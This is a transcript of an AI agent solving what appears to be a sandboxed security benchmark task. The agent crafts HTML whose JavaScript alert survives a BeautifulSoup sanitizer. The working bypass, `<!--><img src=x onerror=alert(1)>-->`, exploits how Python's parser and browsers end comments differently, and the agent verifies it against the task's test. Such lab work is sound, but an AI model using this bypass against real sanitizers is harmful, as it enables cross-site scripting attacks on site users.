[USER QUERY]

{"title":"Create filter-resistant auto-alert HTML","text":"Create /app/out.html such that, even after /app/filter.py processes it in place, opening the resulting HTML file in a browser still automatically triggers a JavaScript alert() without any user interaction. You can run /app/test_outputs.py to verify."}


[PREVIOUS SUMMARY]

The agent inspected filter.py and test_outputs.py, then tried three XSS bypass payloads (style, noscript, comment) in /app/out.html; all failed because BeautifulSoup stripped or escaped the onerror attribute, leaving no working bypass yet.


[OVERLAP EVENTS]

[{"event_id":"event-0005","step_id":6,"source":"agent","thought":"Analysis: Filter closed the comment at --!> and stripped onerror. I need a construct where BeautifulSoup keeps the payload as comment content (raw, on* not stripped) but the browser ends the comment earlier. Chromium treats `<!-->` as an abrupt-closing empty comment, while Python's html.parser keeps searching for `-->`. Let me test whether html.parser swallows the img into a comment.\nPlan: Test `<!--><img src=x onerror=alert(1)>-->` through the filter and inspect output. If BeautifulSoup keeps it inside a comment, the browser will end the comment at `<!-->` and execute the img.","tool_calls":[{"tool_call_id":"call_4_1","tool_name":"bash_command","arguments":{"keystrokes":"printf '%s' '<!--><img src=x onerror=alert(1)>-->' > /tmp/c.html && python /app/filter.py /tmp/c.html && echo '---' && cat /tmp/c.html; echo\n"},"observation":{"raw":"New Terminal Output:\n\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app# printf '%s' '<!--><img src=x onerror=alert(1)>-->' > /tmp/c.html && python /app/filter.py /tmp/c.html && echo '-\n--' && cat /tmp/c.html; echo\n---\n<!--><img src=x onerror=alert(1)>-->\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app#\n"}}]}]


[CORE EVENTS]

[{"event_id":"event-0006","step_id":7,"source":"agent","thought":"Analysis: Excellent! The output is unchanged: BeautifulSoup's html.parser treated the entire `<!--><img src=x onerror=alert(1)>-->` as a single comment, so the onerror attribute was NOT stripped. But in the browser, `<!-->` is an abrupt-closing empty comment, so `<img src=x onerror=alert(1)>` becomes a live element and fires alert(1). This is the bypass.\nPlan: Write this payload to /app/out.html and run the test to confirm it triggers the alert after filtering.","tool_calls":[{"tool_call_id":"call_5_1","tool_name":"bash_command","arguments":{"keystrokes":"printf '%s' '<!--><img src=x onerror=alert(1)>-->' > /app/out.html && cat /app/out.html; echo\n"},"observation":{"raw":"New Terminal Output:\n\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app# printf '%s' '<!--><img src=x onerror=alert(1)>-->' > /app/out.html && cat /app/out.html; echo\n<!--><img src=x onerror=alert(1)>-->\n"}},{"tool_call_id":"call_5_2","tool_name":"bash_command","arguments":{"keystrokes":"cp /app/filter.py /tests/filter.py 2>/dev/null; python /app/test_outputs.py 2>&1 | tail -20\n"},"observation":{"raw":"root@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app# cp /app/filter.py /tests/filter.py 2>/dev/null; python /app/test_outputs.py 2>&1 | tail -20\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app#\n"}}]},{"event_id":"event-0007","step_id":8,"source":"agent","thought":"Analysis: The test file defines a pytest test function but has no __main__ block, so running it directly produced no output. I need to invoke it via pytest to actually execute the test.\nPlan: Run the test with pytest to verify the alert is detected after filtering.","tool_calls":[{"tool_call_id":"call_6_1","tool_name":"bash_command","arguments":{"keystrokes":"cd /app && python -m pytest test_outputs.py -v 2>&1 | tail -25\n"},"observation":{"raw":"New Terminal Output:\n\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app# cd /app && python -m pytest test_outputs.py -v 2>&1 | tail -25\n/usr/local/bin/python: No module named pytest\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app#\n"}}]},{"event_id":"event-0008","step_id":9,"source":"agent","thought":"Analysis: pytest isn't installed. I'll manually invoke the test function by importing it and calling it.\nPlan: Run a small Python snippet that imports the test and calls test_out_html_bypasses_filter(), printing success or the assertion error.","tool_calls":[{"tool_call_id":"call_7_1","tool_name":"bash_command","arguments":{"keystrokes":"cd /app && python -c \"import test_outputs as t; t.test_out_html_bypasses_filter()\" 2>&1 | tail -25\n"},"observation":{"raw":"New Terminal Output:\n\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app# cd /app && python -c \"import test_outputs as t; t.test_out_html_bypasses_filter()\" 2>&1 | tail -25\nTraceback (most recent call last):\n  File \"<string>\", line 1, in <module>\n    import test_outputs as t; t.test_out_html_bypasses_filter()\n                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^\n  File \"/app/test_outputs.py\", line 41, in test_out_html_bypasses_filter\n    assert result.returncode == 0, f\"Filter failed with error: {result.stderr}\"\n           ^^^^^^^^^^^^^^^^^^^^^^\nAssertionError: Filter failed with error: python: can't open file '/tests/filter.py': [Errno 2] No such file or directory\n\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app#\n"}}]},{"event_id":"event-0009","step_id":10,"source":"agent","thought":"Analysis: The test uses /tests/filter.py which doesn't exist. My earlier cp to /tests failed silently (directory missing). I need to create /tests/filter.py as a copy of /app/filter.py so the test can run.\nPlan: Create /tests directory, copy filter.py there, then rerun the test.","tool_calls":[{"tool_call_id":"call_8_1","tool_name":"bash_command","arguments":{"keystrokes":"mkdir -p /tests && cp /app/filter.py /tests/filter.py && python -c \"import test_outputs as t; t.test_out_html_bypasses_filter()\" 2>&1 | tail -25\n"},"observation":{"raw":"New Terminal Output:\n\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app# mkdir -p /tests && cp /app/filter.py /tests/filter.py && python -c \"import test_outputs as t; t.test_out_html_by\npasses_filter()\" 2>&1 | tail -25\n✓ Alert successfully triggered even after filtering! Text: '1'\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app#\n"}}]},{"event_id":"event-0010","step_id":11,"source":"agent","thought":"Analysis: The test passed: '✓ Alert successfully triggered even after filtering! Text: 1'. The payload `<!--><img src=x onerror=alert(1)>-->` in /app/out.html survives the BeautifulSoup html.parser filter (which treats it as a comment, so onerror is not stripped) while the browser treats `<!-->` as an abrupt-closing empty comment, making the img active and firing alert(1).\nPlan: The task is complete. /app/out.html exists and bypasses the filter.","tool_calls":[{"tool_call_id":"call_9_task_complete","tool_name":"mark_task_complete","arguments":{},"observation":{"raw":"Current terminal state:\nNew Terminal Output:\n\nroot@47cf51ce-5954-411b-b1fd-9e2dfcf2cc84:/app#\n\n\nAre you sure you want to mark the task as complete? This will trigger your solution to be graded and you won't be able to make any further corrections. If so, include \"task_complete\": true in your JSON response again."}}]}]


[FUTURE SUMMARY]

The agent confirmed the test passed: after /app/filter.py processed /app/out.html, the payload `<!--><img src=x onerror=alert(1)>-->` still triggered alert(1) in a browser, and marked the task complete.

